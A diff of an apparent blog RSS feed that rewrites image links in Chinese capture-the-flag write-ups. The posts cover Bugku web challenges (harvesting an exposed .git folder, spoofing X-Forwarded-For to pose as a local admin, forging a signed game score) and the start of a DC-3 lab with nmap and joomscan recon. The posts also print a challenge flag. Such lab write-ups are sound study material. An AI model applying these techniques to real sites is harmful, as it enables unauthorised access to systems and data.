@@ -14,10 +14,10 @@
         
         <guid>https://1noah11.github.io/lyeve.github.io/p/bugku/</guid>
         <description>&lt;p&gt;做了20题左右，仅记录了几道略难的题目。
-&lt;img src=&#34;../lyeve.github.io/p/bugku/img0.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img0.png&#34;
 	width=&#34;496&#34;
 	height=&#34;906&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img0_hu_776c3fc6fb47df2a.png 480w, ../lyeve.github.io/p/bugku/img0_hu_c48598364cdb92a3.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img0_hu_776c3fc6fb47df2a.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img0_hu_c48598364cdb92a3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -27,10 +27,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;h2 id=&#34;source&#34;&gt;source
-&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/bugku/img1.png&#34;
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img1.png&#34;
 	width=&#34;461&#34;
 	height=&#34;184&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img1_hu_78b75dc8df107ae4.png 480w, ../lyeve.github.io/p/bugku/img1_hu_affd7f51a9d1ecb9.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img1_hu_78b75dc8df107ae4.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img1_hu_affd7f51a9d1ecb9.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -42,10 +42,10 @@
 查看源码，发现一个类似flag的内容，尝试了一下不对，&lt;/p&gt;
 &lt;p&gt;用网页开发者工具查看cookie，也没有东西
 尝试用目录扫描工具，dirsearch扫一下
-&lt;img src=&#34;../lyeve.github.io/p/bugku/img2.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img2.png&#34;
 	width=&#34;837&#34;
 	height=&#34;750&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img2_hu_45bd5d0591c99c7b.png 480w, ../lyeve.github.io/p/bugku/img2_hu_83f3194d0fc83b15.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img2_hu_45bd5d0591c99c7b.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img2_hu_83f3194d0fc83b15.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -57,10 +57,10 @@
 发现有 .git 隐藏文件夹（它用来记录当前项目所有的版本历史，也能恢复代码到某次版本下）   那怎么把这个 .git 文件夹弄到本地来呢&lt;/p&gt;
 &lt;p&gt;使用kali自带的wget命令，
 wget -r https://你的服务器网站地址/.git&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/bugku/img3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img3.png&#34;
 	width=&#34;655&#34;
 	height=&#34;276&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img3_hu_7b8197822859b69f.png 480w, ../lyeve.github.io/p/bugku/img3_hu_dbd941a08b036548.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img3_hu_7b8197822859b69f.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img3_hu_dbd941a08b036548.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -74,10 +74,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 一次是e0b8e8e
 回滚到d256328，发现flag.txt被删除了，但实际上只要 .git 文件夹还在，任何人都可以通过 git log和 git show 找回被删除的敏感文件
 使用ll命令查看后发现没有flag文件
-&lt;img src=&#34;../lyeve.github.io/p/bugku/img4.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img4.png&#34;
 	width=&#34;624&#34;
 	height=&#34;604&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img4_hu_905cc25a701102da.png 480w, ../lyeve.github.io/p/bugku/img4_hu_85a7e65563f6cbb1.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img4_hu_905cc25a701102da.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img4_hu_85a7e65563f6cbb1.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -87,10 +87,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 	
 &gt;
 输入git show d25632查看改动情况
-&lt;img src=&#34;../lyeve.github.io/p/bugku/img5.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img5.png&#34;
 	width=&#34;572&#34;
 	height=&#34;255&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img5_hu_b2af5d400ec62e45.png 480w, ../lyeve.github.io/p/bugku/img5_hu_9125801d9b33f738.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img5_hu_b2af5d400ec62e45.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img5_hu_9125801d9b33f738.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -101,10 +101,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 &gt;
 发现这是一个假的flag&lt;/p&gt;
 &lt;p&gt;使用git reflog
-&lt;img src=&#34;../lyeve.github.io/p/bugku/img6.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img6.png&#34;
 	width=&#34;616&#34;
 	height=&#34;199&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img6_hu_e2ecb8d66d47e51e.png 480w, ../lyeve.github.io/p/bugku/img6_hu_4eaa2868efc5c695.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img6_hu_e2ecb8d66d47e51e.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img6_hu_4eaa2868efc5c695.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -116,10 +116,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 &lt;p&gt;发现还有很多历史版本，
 然后使用git show xxxx挨个扫
 发现果然flag藏在其中
-&lt;img src=&#34;../lyeve.github.io/p/bugku/img8.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img8.png&#34;
 	width=&#34;528&#34;
 	height=&#34;306&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img8_hu_1d27abf7c4e6bd4e.png 480w, ../lyeve.github.io/p/bugku/img8_hu_e38855110c5a1b83.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img8_hu_1d27abf7c4e6bd4e.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img8_hu_e38855110c5a1b83.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -130,10 +130,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;h2 id=&#34;本地管理员&#34;&gt;本地管理员
 &lt;/h2&gt;&lt;p&gt;查看源码：
-&lt;img src=&#34;../lyeve.github.io/p/bugku/img9.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img9.png&#34;
 	width=&#34;1723&#34;
 	height=&#34;810&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img9_hu_169cfa500638457a.png 480w, ../lyeve.github.io/p/bugku/img9_hu_3b284365eda5662b.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img9_hu_169cfa500638457a.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img9_hu_3b284365eda5662b.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -144,10 +144,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;发现一个编码，解码后是test123，不知道是密码还是账号
 试一下
-&lt;img src=&#34;../lyeve.github.io/p/bugku/img10.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img10.png&#34;
 	width=&#34;440&#34;
 	height=&#34;232&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img10_hu_e92fe10a44a3ee6.png 480w, ../lyeve.github.io/p/bugku/img10_hu_678059edd2d6fd07.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img10_hu_e92fe10a44a3ee6.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img10_hu_678059edd2d6fd07.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -158,10 +158,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 &gt;
 发现ip禁止访问，有提示是要本地管理员登录，所以尝试把ip改为127.0.0.1
 用bp抓包重放，添加X-Forwarded-For:127.0.0.1字段
-&lt;img src=&#34;../lyeve.github.io/p/bugku/img11.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img11.png&#34;
 	width=&#34;1583&#34;
 	height=&#34;644&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img11_hu_e6a1374caadbff37.png 480w, ../lyeve.github.io/p/bugku/img11_hu_5e0a2cc28d668a03.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img11_hu_e6a1374caadbff37.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img11_hu_5e0a2cc28d668a03.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -172,10 +172,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 &gt;
 回显变了，说明ip是对的，要修改密码账号信息才可以
 ，然后试了一下admin就成功了
-&lt;img src=&#34;../lyeve.github.io/p/bugku/img12.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img12.png&#34;
 	width=&#34;1673&#34;
 	height=&#34;657&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img12_hu_411674c4ea8b3b72.png 480w, ../lyeve.github.io/p/bugku/img12_hu_f04b8d6ca7d66dbb.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img12_hu_411674c4ea8b3b72.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img12_hu_f04b8d6ca7d66dbb.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -187,10 +187,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 &lt;h2 id=&#34;game1&#34;&gt;game1
 &lt;/h2&gt;&lt;p&gt;猜测玩游戏得到一定分数就可以获得flag，抓包然后修改score为10000，不行
 因为后面有个sign值，sign值的作用，进行签名，把数据做了加密后产生的，后台会把提交过去的数据做相同处理产生 sign 值和你发过去的 sign 值做判断，不一致则数据是被篡改了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/bugku/img13.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img13.png&#34;
 	width=&#34;1415&#34;
 	height=&#34;563&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img13_hu_3a94b64e2b6d8582.png 480w, ../lyeve.github.io/p/bugku/img13_hu_6f9107ba6badf8e6.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img13_hu_3a94b64e2b6d8582.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img13_hu_6f9107ba6badf8e6.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -201,10 +201,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;查看源码，sign值是如何生成的
 发现是base64&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/bugku/img14.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img14.png&#34;
 	width=&#34;605&#34;
 	height=&#34;171&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img14_hu_b9657683ca67b8eb.png 480w, ../lyeve.github.io/p/bugku/img14_hu_66372422ee7d5220.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img14_hu_b9657683ca67b8eb.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img14_hu_66372422ee7d5220.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -213,10 +213,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 		data-flex-basis=&#34;849px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/bugku/img15.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img15.png&#34;
 	width=&#34;212&#34;
 	height=&#34;440&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img15_hu_ef8c621cb20b1277.png 480w, ../lyeve.github.io/p/bugku/img15_hu_77d08777802f4089.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img15_hu_ef8c621cb20b1277.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img15_hu_77d08777802f4089.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -228,10 +228,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 &lt;p&gt;把生成的加密结果放入bp发现还是不行
 继续分析源码，发现有一个自定义的base.js，应该是自设的编码机制
 然后直接在浏览器控制台调用函数，解码后的内容复制到bp的sign&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/bugku/img16.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img16.png&#34;
 	width=&#34;312&#34;
 	height=&#34;134&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img16_hu_f7d674bbad79b6b7.png 480w, ../lyeve.github.io/p/bugku/img16_hu_580073fea1be0f98.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img16_hu_f7d674bbad79b6b7.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img16_hu_580073fea1be0f98.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -240,10 +240,10 @@ wget -r https://你的服务器网站地址/.git&lt;/p&gt;
 		data-flex-basis=&#34;558px&#34;
 	
 &gt;
-&lt;img src=&#34;../lyeve.github.io/p/bugku/img17.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img17.png&#34;
 	width=&#34;1348&#34;
 	height=&#34;349&#34;
-	srcset=&#34;../lyeve.github.io/p/bugku/img17_hu_f0bb401faceaa3ac.png 480w, ../lyeve.github.io/p/bugku/img17_hu_7e4811f8c041bb71.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/bugku/img17_hu_f0bb401faceaa3ac.png 480w, https://1noah11.github.io/lyeve.github.io/p/bugku/img17_hu_7e4811f8c041bb71.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -264,10 +264,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
         <description>&lt;h3 id=&#34;一环境搭建过程&#34;&gt;一、&lt;strong&gt;环境搭建过程&lt;/strong&gt;
 &lt;/h3&gt;&lt;p&gt;(1) 下载DC-3靶场 拖入VMware。&lt;/p&gt;
 &lt;p&gt;(2) 修改网络适配器为NAT模式&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image002.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image002.png&#34;
 	width=&#34;419&#34;
 	height=&#34;328&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image002_hu_dfbc1d0d906d3f7b.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image002_hu_f5ee5fc787a1dea0.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image002_hu_dfbc1d0d906d3f7b.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image002_hu_f5ee5fc787a1dea0.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -277,10 +277,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 	
 &gt; &lt;/p&gt;
 &lt;p&gt;(3) 修改IDE 改为0：0&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image003.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image003.png&#34;
 	width=&#34;434&#34;
 	height=&#34;483&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image003_hu_ad80b7058af86ba7.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image003_hu_a384dc9f5b9e36bf.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image003_hu_ad80b7058af86ba7.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image003_hu_a384dc9f5b9e36bf.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -292,10 +292,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;图2 IDE设置&lt;/p&gt;
 &lt;h3 id=&#34;二渗透测试过程&#34;&gt;二、&lt;strong&gt;渗透测试过程&lt;/strong&gt;
 &lt;/h3&gt;&lt;p&gt;(1)首先进入kali虚拟机打开终端，输入ip addr查询靶场的ip如图1所示，靶场ip为192.168.248.0/24&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image005.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image005.png&#34;
 	width=&#34;833&#34;
 	height=&#34;247&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image005_hu_8b2dac9b79ec6cbc.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image005_hu_50cc58dd76592dcc.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image005_hu_8b2dac9b79ec6cbc.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image005_hu_50cc58dd76592dcc.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -308,10 +308,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;(2)利用namp工具查询目标靶机&lt;/p&gt;
 &lt;p&gt;Kali虚拟机的ip为192.168.248.135&lt;/p&gt;
 &lt;p&gt;靶机的ip为192.168.248.136&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image008.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image008.png&#34;
 	width=&#34;537&#34;
 	height=&#34;285&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image008_hu_316ff335cfd5d0b1.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image008_hu_5b1a6c8516629605.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image008_hu_316ff335cfd5d0b1.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image008_hu_5b1a6c8516629605.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -324,10 +324,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;(3)探端口以及服务&lt;/p&gt;
 &lt;p&gt;利用nmap -A -p- -v命令查询端口开启状况&lt;/p&gt;
 &lt;p&gt;可以看到80端口是开放的，存在web服务，Apache/2.4.18&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image010.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image010.png&#34;
 	width=&#34;385&#34;
 	height=&#34;233&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image010_hu_7ab85ff995c9677.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image010_hu_14b8d7f6fa26c54d.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image010_hu_7ab85ff995c9677.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image010_hu_14b8d7f6fa26c54d.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -339,10 +339,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;图5 靶机的端口及服务开启情况&lt;/p&gt;
 &lt;p&gt;(4)访问&lt;a class=&#34;link&#34; href=&#34;http://192,168,248,136&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;http://192,168,248,136&lt;/a&gt; &lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image012.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image012.png&#34;
 	width=&#34;535&#34;
 	height=&#34;275&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image012_hu_cfc02b4f3019a637.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image012_hu_d5666a15a7c10851.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image012_hu_cfc02b4f3019a637.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image012_hu_d5666a15a7c10851.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -354,10 +354,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;图6 访问靶机主页地址&lt;/p&gt;
 &lt;p&gt;页面显示必须获得权限&lt;/p&gt;
 &lt;p&gt;(5)安装joomscan&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image014.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image014.png&#34;
 	width=&#34;459&#34;
 	height=&#34;259&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image014_hu_f2b5587d6f40b6bd.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image014_hu_318b23aff2c4fc29.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image014_hu_f2b5587d6f40b6bd.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image014_hu_318b23aff2c4fc29.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -368,10 +368,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图7 安装joomscan&lt;/p&gt;
 &lt;p&gt;(6) 利用joomscan &amp;ndash;url http://192.168.248.136命令&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image016.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image016.png&#34;
 	width=&#34;487&#34;
 	height=&#34;626&#34;
